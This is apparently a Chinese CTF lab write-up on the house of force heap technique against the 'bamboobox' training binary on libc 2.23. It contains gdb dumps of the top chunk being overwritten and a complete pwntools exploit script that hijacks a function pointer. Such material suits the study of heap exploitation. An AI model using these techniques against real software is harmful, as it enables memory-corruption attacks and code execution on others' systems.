        io.interactive()
## hitcontraning_lab11(house of force)
这题算是实验，所以直接调试exp，  
运行环境： libc2.23.so
最新的libc2.29似乎加入了检查，运行exp报错
### 漏洞利用过程
申请一个堆块状态，目的是覆盖top chunk
    gdb-peda$ x/30gx 0x25ed000
    0x25ed000:  0x0000000000000000  0x0000000000000021
    0x25ed010:  0x0000000000400896  0x00000000004008b1
    0x25ed020:  0x0000000000000000  0x0000000000000041
    0x25ed030:  0x0000000a61616464  0x0000000000000000
    0x25ed040:  0x0000000000000000  0x0000000000000000
    0x25ed050:  0x0000000000000000  0x0000000000000000
    0x25ed060:  0x0000000000000000  0x0000000000020fa1
    0x25ed070:  0x0000000000000000  0x0000000000000000
    0x25ed080:  0x0000000000000000  0x0000000000000000
    0x25ed090:  0x0000000000000000  0x0000000000000000
    0x25ed0a0:  0x0000000000000000  0x0000000000000000
    0x25ed0b0:  0x0000000000000000  0x0000000000000000
    0x25ed0c0:  0x0000000000000000  0x0000000000000000
    0x25ed0d0:  0x0000000000000000  0x0000000000000000
    0x25ed0e0:  0x0000000000000000  0x0000000000000000
通过edit 覆盖到top chunk的size部分
    gdb-peda$ x/30gx 0x25ed030-0x30
    0x25ed000:  0x0000000000000000  0x0000000000000021
    0x25ed010:  0x0000000000400896  0x00000000004008b1
    0x25ed020:  0x0000000000000000  0x0000000000000041
    0x25ed030:  0x6161616161616161  0x6161616161616161
    0x25ed040:  0x6161616161616161  0x6161616161616161
    0x25ed050:  0x6161616161616161  0x6161616161616161
    0x25ed060:  0x6161616161616161  0xffffffffffffffff
    0x25ed070:  0x000000000000000a  0x0000000000000000
此时top chunk位置0x00000000025ed060
    gdb-peda$ p &main_arena
    $1 = (malloc_state *) 0x7f2a72614b20 
    gdb-peda$ x/20gx 0x7f2a72614b20
    0x7f2a72614b20 :    0x0000000100000000  0x0000000000000000
    0x7f2a72614b30 : 0x0000000000000000  0x0000000000000000
    0x7f2a72614b40 : 0x0000000000000000  0x0000000000000000
    0x7f2a72614b50 : 0x0000000000000000  0x0000000000000000
    0x7f2a72614b60 : 0x0000000000000000  0x0000000000000000
    0x7f2a72614b70 : 0x0000000000000000  0x00000000025ed060
位置为0x25ed060处，我们要覆盖的是0x25ed010处指针，故偏移为0x25ed060-0x25ed010-0x10 = 0x60
不过是负的，我们要往上偏移，所以要malloc(-)的
    /*
       Check if a request is so large that it would wrap around zero when
       padded and aligned. To simplify some other code, the bound is made
       low enough so that adding MINSIZE will also not wrap around zero.
     */
    #define REQUEST_OUT_OF_RANGE(req)                                              \
        ((unsigned long) (req) >= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))
    /* pad request bytes into a usable size -- internal version */
    //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1
    #define request2size(req)                                                      \
        (((req) + SIZE_SZ + MALLOC_ALIGN_MASK 
    gdb-peda$ x/20gx 0x7f2a72614b20
    0x7f2a72614b20 :    0x0000000100000000  0x0000000000000000
    0x7f2a72614b30 : 0x0000000000000000  0x0000000000000000
    0x7f2a72614b40 : 0x0000000000000000  0x0000000000000000
    0x7f2a72614b50 : 0x0000000000000000  0x0000000000000000
    0x7f2a72614b60 : 0x0000000000000000  0x0000000000000000
    0x7f2a72614b70 : 0x0000000000000000  0x00000000025ed000
    0x7f2a72614b80 : 0x0000000000000000  0x00007f2a72614b78
    0x7f2a72614b90 :    0x00007f2a72614b78  0x00007f2a72614b88
    0x7f2a72614ba0 :    0x00007f2a72614b88  0x00007f2a72614b98
    0x7f2a72614bb0 :    0x00007f2a72614b98  0x00007f2a72614ba8
    gdb-peda$ x/10gx 0x00000000025ed000
    0x25ed000:  0x0000000000000000  0x0000000000000059
    0x25ed010:  0x0000000000400896  0x00000000004008b1
    0x25ed020:  0x0000000000000000  0x0000000000000041
    0x25ed030:  0x6161616161616161  0x6161616161616161
    0x25ed040:  0x6161616161616161  0x6161616161616161
你看成功转移到这里了，现在在malloc一次就可以了
    0x1483000 FASTBIN {
      prev_size = 0x0, 
      size = 0x21, 
      fd = 0x400d49 , 
      bk = 0x400d49 , 
      fd_nextsize = 0x0, 
      bk_nextsize = 0x39
    }
    0x1483020 PREV_INUSE {
      prev_size = 0x0, 
      size = 0x39, 
      fd = 0x6161616161616161, 
      bk = 0x6161616161616161, 
      fd_nextsize = 0x6161616161616161, 
      bk_nextsize = 0x6161616161616161
    }
    0x1483058 PREV_INUSE {
      prev_size = 0x6161616161616161, 
      size = 0x6161616161616161, 
      fd = 0xffffffffffffa1, 
      bk = 0xa, 
      fd_nextsize = 0x0, 
      bk_nextsize = 0x0
    }
成功覆盖，最后退出一下就好了
### exp
这里直接用的ctf-wiki的exp,我只改动了一处，他还减多个0xf,没看懂，所以删掉了，也没事
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    
    from pwn import *
    r = process('./bamboobox')
    context.log_level = 'debug'
    def additem(length, name):
        r.recvuntil(":")
        r.sendline("2")
        r.recvuntil(":")
        r.sendline(str(length))
        r.recvuntil(":")
        r.sendline(name)
    def modify(idx, length, name):
        r.recvuntil(":")
        r.sendline("3")
        r.recvuntil(":")
        r.sendline(str(idx))
        r.recvuntil(":")
        r.sendline(str(length))
        r.recvuntil(":")
        r.sendline(name)
    def remove(idx):
        r.recvuntil(":")
        r.sendline("4")
        r.recvuntil(":")
        r.sendline(str(idx))
    def show():
        r.recvuntil(":")
        r.sendline("1")
    magic = 0x400d49
    # we must alloc enough size, so as to successfully alloc from fake topchunk
    additem(0x30, "ddaa")  # idx 0
    payload = 0x30 * 'a'  # idx 0's content
    payload += 'a' * 8 + p64(0xffffffffffffffff)  # top chunk's prev_size and size
    # modify topchunk's size to -1
    modify(0, 0x41, payload)
    # top chunk's offset to heap base
    offset_to_heap_base = -(0x40 + 0x20)
    malloc_size = offset_to_heap_base - 0x8 
    additem(malloc_size, "dada")
    additem(0x10, p64(magic) * 2)
    gdb.attach(r)
    print r.recv()
    r.interactive()
## 总结
一次性学了house of einherjar和house of force,ctf-wiki还是强，不过有些得自己调试才好,适合自己的才是最好的